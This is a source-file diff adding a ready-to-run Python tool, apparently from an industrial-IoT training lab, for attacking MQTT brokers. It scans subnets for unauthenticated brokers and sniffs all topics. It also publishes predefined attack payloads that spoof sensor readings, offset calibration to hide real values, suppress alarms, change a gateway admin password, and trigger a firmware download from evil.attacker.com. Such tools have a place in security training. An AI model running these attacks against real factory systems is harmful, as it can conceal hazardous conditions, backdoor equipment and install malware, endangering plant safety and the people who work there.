@@ -1,0 +1,472 @@
+#!/usr/bin/env python3
+"""
+VULNOT MQTT/IIoT Attack Tools
+Tools for attacking MQTT brokers and IIoT infrastructure
+"""
+
+import argparse
+import socket
+import struct
+import sys
+import time
+import json
+import threading
+from typing import Optional, List, Dict
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.live import Live
+from rich.prompt import Confirm
+
+console = Console()
+
+MQTT_PORT = 1883
+
+
+class SimpleMQTTClient:
+    """Simple MQTT client for attacks"""
+    
+    def __init__(self, host: str, port: int = 1883):
+        self.host = host
+        self.port = port
+        self.sock: Optional[socket.socket] = None
+        self.connected = False
+        self.messages: List[dict] = []
+        self.subscribed_topics: List[str] = []
+        
+    def connect(self, client_id: str = "vulnot-attacker") -> bool:
+        """Connect to MQTT broker"""
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.settimeout(5)
+            self.sock.connect((self.host, self.port))
+            
+            # Build CONNECT packet
+            client_id_bytes = client_id.encode()
+            
+            # Variable header
+            var_header = bytes([
+                0x00, 0x04,  # Protocol name length
+            ]) + b'MQTT' + bytes([
+                0x04,  # Protocol level (4 = 3.1.1)
+                0x02,  # Connect flags (clean session)
+                0x00, 0x3C,  # Keep alive (60 seconds)
+            ])
+            
+            # Payload
+            payload = struct.pack('>H', len(client_id_bytes)) + client_id_bytes
+            
+            # Fixed header
+            remaining = len(var_header) + len(payload)
+            fixed_header = bytes([0x10, remaining])
+            
+            self.sock.send(fixed_header + var_header + payload)
+            
+            # Wait for CONNACK
+            response = self.sock.recv(4)
+            if len(response) >= 4 and response[0] == 0x20:
+                self.connected = True
+                return True
+                
+            return False
+        except Exception as e:
+            console.print(f"[red]Connection failed: {e}[/]")
+            return False
+            
+    def subscribe(self, topic: str, qos: int = 0) -> bool:
+        """Subscribe to topic"""
+        if not self.connected:
+            return False
+            
+        # Build SUBSCRIBE packet
+        msg_id = 1
+        topic_bytes = topic.encode()
+        
+        var_header = struct.pack('>H', msg_id)
+        payload = struct.pack('>H', len(topic_bytes)) + topic_bytes + bytes([qos])
+        
+        remaining = len(var_header) + len(payload)
+        fixed_header = bytes([0x82, remaining])
+        
+        self.sock.send(fixed_header + var_header + payload)
+        
+        # Wait for SUBACK
+        response = self.sock.recv(5)
+        if response[0] == 0x90:
+            self.subscribed_topics.append(topic)
+            return True
+        return False
+        
+    def publish(self, topic: str, payload: str, qos: int = 0) -> bool:
+        """Publish message to topic"""
+        if not self.connected:
+            return False
+            
+        topic_bytes = topic.encode()
+        payload_bytes = payload.encode()
+        
+        var_header = struct.pack('>H', len(topic_bytes)) + topic_bytes
+        
+        remaining = len(var_header) + len(payload_bytes)
+        fixed_header = bytes([0x30 | (qos << 1), remaining])
+        
+        self.sock.send(fixed_header + var_header + payload_bytes)
+        return True
+        
+    def receive_messages(self, timeout: float = 5.0) -> List[dict]:
+        """Receive messages"""
+        messages = []
+        self.sock.settimeout(0.5)
+        start = time.time()
+        
+        while time.time() - start < timeout:
+            try:
+                data = self.sock.recv(1024)
+                if data and (data[0] >> 4) == 3:  # PUBLISH
+                    # Parse PUBLISH
+                    topic_len = (data[2] << 8) | data[3]
+                    topic = data[4:4+topic_len].decode()
+                    payload = data[4+topic_len:].decode('utf-8', errors='ignore')
+                    messages.append({
+                        'topic': topic,
+                        'payload': payload,
+                        'timestamp': time.time()
+                    })
+            except socket.timeout:
+                continue
+            except:
+                break
+                
+        return messages
+        
+    def close(self):
+        """Close connection"""
+        if self.sock:
+            # Send DISCONNECT
+            self.sock.send(bytes([0xE0, 0x00]))
+            self.sock.close()
+            self.connected = False
+
+
+def cmd_scan(args):
+    """Scan for MQTT brokers"""
+    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
+    console.print("[bold cyan]║      VULNOT MQTT Broker Scanner        ║[/]")
+    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
+    
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    
+    def check_host(ip):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            result = sock.connect_ex((ip, args.port))
+            sock.close()
+            if result == 0:
+                client = SimpleMQTTClient(ip, args.port)
+                if client.connect():
+                    client.close()
+                    return (ip, True, "No Auth Required!")
+                return (ip, False, "Port Open")
+        except:
+            pass
+        return None
+    
+    if '/' in args.network:
+        base = args.network.split('/')[0]
+        prefix = base.rsplit('.', 1)[0]
+        hosts = [f"{prefix}.{i}" for i in range(1, 255)]
+    else:
+        hosts = [args.network]
+    
+    console.print(f"[yellow]Scanning {len(hosts)} hosts for MQTT on port {args.port}...[/]\n")
+    
+    found = []
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        futures = {executor.submit(check_host, ip): ip for ip in hosts}
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                found.append(result)
+    
+    if found:
+        table = Table(title="Discovered MQTT Brokers")
+        table.add_column("IP Address", style="cyan")
+        table.add_column("Port", style="green")
+        table.add_column("Status", style="yellow")
+        
+        for ip, mqtt_ok, status in sorted(found):
+            color = "green" if mqtt_ok else "yellow"
+            table.add_row(ip, str(args.port), f"[{color}]{status}[/]")
+        
+        console.print(table)
+    else:
+        console.print("[red]No MQTT brokers found[/]\n")
+
+
+def cmd_subscribe(args):
+    """Subscribe to MQTT topics"""
+    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
+    console.print("[bold cyan]║      VULNOT MQTT Topic Listener        ║[/]")
+    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(f"[yellow]Connecting to {args.broker}:{args.port}...[/]")
+    
+    client = SimpleMQTTClient(args.broker, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    console.print("[green]Connected (NO AUTHENTICATION)![/]\n")
+    
+    topic = args.topic
+    console.print(f"[yellow]Subscribing to: {topic}[/]")
+    
+    if not client.subscribe(topic):
+        console.print("[red]Subscribe failed[/]")
+        return
+        
+    console.print(f"[green]Subscribed! Listening for messages...[/]\n")
+    console.print("[dim]Press Ctrl+C to stop[/]\n")
+    
+    try:
+        while True:
+            messages = client.receive_messages(timeout=1)
+            for msg in messages:
+                console.print(f"[cyan]{msg['topic']}[/] = [green]{msg['payload'][:100]}[/]")
+    except KeyboardInterrupt:
+        pass
+    finally:
+        client.close()
+        console.print("\n[dim]Disconnected[/]")
+
+
+def cmd_publish(args):
+    """Publish to MQTT topic"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT MQTT Message Publisher     ║[/]")
+    console.print("[bold red]║   ⚠️  INJECTS DATA INTO MQTT BROKER     ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(f"[yellow]Broker: {args.broker}:{args.port}[/]")
+    console.print(f"[yellow]Topic: {args.topic}[/]")
+    console.print(f"[yellow]Payload: {args.payload}[/]\n")
+    
+    if not args.force:
+        if not Confirm.ask("[bold red]Publish this message?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = SimpleMQTTClient(args.broker, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    if client.publish(args.topic, args.payload):
+        console.print(f"\n[green]✓ Message published[/]")
+    else:
+        console.print(f"\n[red]✗ Publish failed[/]")
+    
+    client.close()
+
+
+def cmd_enum(args):
+    """Enumerate MQTT topics and devices"""
+    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
+    console.print("[bold cyan]║      VULNOT MQTT Topic Enumeration     ║[/]")
+    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(f"[yellow]Connecting to {args.broker}:{args.port}...[/]")
+    
+    client = SimpleMQTTClient(args.broker, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    console.print("[green]Connected![/]\n")
+    
+    # Subscribe to wildcard
+    console.print("[yellow]Subscribing to '#' (all topics)...[/]")
+    client.subscribe("#")
+    
+    console.print(f"[yellow]Collecting messages for {args.duration} seconds...[/]\n")
+    
+    topics = {}
+    start = time.time()
+    
+    while time.time() - start < args.duration:
+        messages = client.receive_messages(timeout=1)
+        for msg in messages:
+            topic = msg['topic']
+            if topic not in topics:
+                topics[topic] = {
+                    'count': 0,
+                    'last_payload': '',
+                    'first_seen': time.time()
+                }
+            topics[topic]['count'] += 1
+            topics[topic]['last_payload'] = msg['payload'][:50]
+    
+    client.close()
+    
+    if topics:
+        table = Table(title=f"Discovered Topics ({len(topics)})")
+        table.add_column("Topic", style="cyan")
+        table.add_column("Messages", style="green")
+        table.add_column("Sample Payload", style="yellow")
+        
+        for topic, info in sorted(topics.items()):
+            table.add_row(topic, str(info['count']), info['last_payload'])
+        
+        console.print(table)
+        
+        # Identify potential attack vectors
+        console.print("\n[bold yellow]Potential Attack Vectors:[/]")
+        for topic in topics:
+            if 'cmd' in topic.lower() or 'control' in topic.lower():
+                console.print(f"  [red]• Command topic: {topic}[/]")
+            if 'config' in topic.lower():
+                console.print(f"  [red]• Config topic: {topic}[/]")
+            if 'firmware' in topic.lower() or 'update' in topic.lower():
+                console.print(f"  [red]• Firmware topic: {topic}[/]")
+    else:
+        console.print("[yellow]No messages received[/]")
+
+
+def cmd_attack(args):
+    """Execute predefined MQTT attacks"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT MQTT Attack Scenarios      ║[/]")
+    console.print("[bold red]║   ⚠️  DANGEROUS - USE WITH CAUTION      ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    attacks = {
+        'sensor_spoof': {
+            'name': 'Sensor Data Spoofing',
+            'description': 'Inject false sensor readings',
+            'topic': 'factory/sensors/line1/TEMP-L1-01',
+            'payload': '{"sensor_id":"TEMP-L1-01","value":25.0,"alarm":false}'
+        },
+        'calibration': {
+            'name': 'Sensor Calibration Attack',
+            'description': 'Modify sensor offset to hide real values',
+            'topic': 'factory/control/TEMP-L1-01/cmd',
+            'payload': '{"offset": -30, "scale": 1.0}'
+        },
+        'alarm_suppress': {
+            'name': 'Alarm Threshold Manipulation',
+            'description': 'Raise alarm thresholds to suppress warnings',
+            'topic': 'factory/control/TEMP-L1-01/cmd',
+            'payload': '{"high_alarm": 999, "low_alarm": -999}'
+        },
+        'gateway_backdoor': {
+            'name': 'Gateway Credential Change',
+            'description': 'Change gateway admin password',
+            'topic': 'factory/gateway/GW-LINE1/config',
+            'payload': '{"admin_password": "hacked123"}'
+        },
+        'firmware_inject': {
+            'name': 'Malicious Firmware Update',
+            'description': 'Trigger firmware update from attacker server',
+            'topic': 'factory/firmware/GW-LINE1/update',
+            'payload': '{"url": "http://evil.attacker.com/malware.bin"}'
+        },
+    }
+    
+    if args.scenario not in attacks:
+        console.print(f"[red]Unknown attack: {args.scenario}[/]")
+        console.print(f"Available: {', '.join(attacks.keys())}")
+        return
+        
+    attack = attacks[args.scenario]
+    
+    console.print(Panel(
+        f"[bold red]{attack['name']}[/]\n\n"
+        f"{attack['description']}\n\n"
+        f"[yellow]Topic:[/] {attack['topic']}\n"
+        f"[yellow]Payload:[/] {attack['payload']}",
+        title="⚠️ ATTACK SCENARIO",
+        border_style="red"
+    ))
+    
+    if not args.force:
+        if not Confirm.ask("\n[bold red]Execute this attack?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = SimpleMQTTClient(args.broker, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    if client.publish(attack['topic'], attack['payload']):
+        console.print(f"\n[red]✓ Attack executed: {attack['name']}[/]")
+    else:
+        console.print(f"\n[red]✗ Attack failed[/]")
+    
+    client.close()
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='VULNOT MQTT Attack Tools',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  vulnot-mqtt scan -n 10.0.7.0/24
+  vulnot-mqtt subscribe -b 10.0.7.5 -t '#'
+  vulnot-mqtt publish -b 10.0.7.5 -t 'factory/control/TEMP-L1-01/cmd' -p '{"offset": -20}'
+  vulnot-mqtt enum -b 10.0.7.5 -d 30
+  vulnot-mqtt attack -b 10.0.7.5 -s sensor_spoof
+        """
+    )
+    
+    subparsers = parser.add_subparsers(dest='command')
+    
+    # Scan
+    scan_p = subparsers.add_parser('scan', help='Scan for MQTT brokers')
+    scan_p.add_argument('-n', '--network', default='10.0.7.0/24', help='Network')
+    scan_p.add_argument('-p', '--port', type=int, default=1883, help='Port')
+    
+    # Subscribe
+    sub_p = subparsers.add_parser('subscribe', help='Subscribe to topics')
+    sub_p.add_argument('-b', '--broker', required=True, help='Broker IP')
+    sub_p.add_argument('-p', '--port', type=int, default=1883, help='Port')
+    sub_p.add_argument('-t', '--topic', default='#', help='Topic (default: #)')
+    
+    # Publish
+    pub_p = subparsers.add_parser('publish', help='Publish message')
+    pub_p.add_argument('-b', '--broker', required=True, help='Broker IP')
+    pub_p.add_argument('-p', '--port', type=int, default=1883, help='Port')
+    pub_p.add_argument('-t', '--topic', required=True, help='Topic')
+    pub_p.add_argument('--payload', required=True, help='Payload')
+    pub_p.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    # Enumerate
+    enum_p = subparsers.add_parser('enum', help='Enumerate topics')
+    enum_p.add_argument('-b', '--broker', required=True, help='Broker IP')
+    enum_p.add_argument('-p', '--port', type=int, default=1883, help='Port')
+    enum_p.add_argument('-d', '--duration', type=int, default=10, help='Duration (seconds)')
+    
+    # Attack
+    atk_p = subparsers.add_parser('attack', help='Execute attack scenario')
+    atk_p.add_argument('-b', '--broker', required=True, help='Broker IP')
+    atk_p.add_argument('-p', '--port', type=int, default=1883, help='Port')
+    atk_p.add_argument('-s', '--scenario', required=True, 
+                       choices=['sensor_spoof', 'calibration', 'alarm_suppress', 'gateway_backdoor', 'firmware_inject'])
+    atk_p.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    args = parser.parse_args()
+    
+    if args.command == 'scan':
+        cmd_scan(args)
+    elif args.command == 'subscribe':
+        cmd_subscribe(args)
+    elif args.command == 'publish':
+        cmd_publish(args)
+    elif args.command == 'enum':
+        cmd_enum(args)
+    elif args.command == 'attack':
+        cmd_attack(args)
+    else:
+        parser.print_help()
+
+
+if __name__ == '__main__':
+    main()
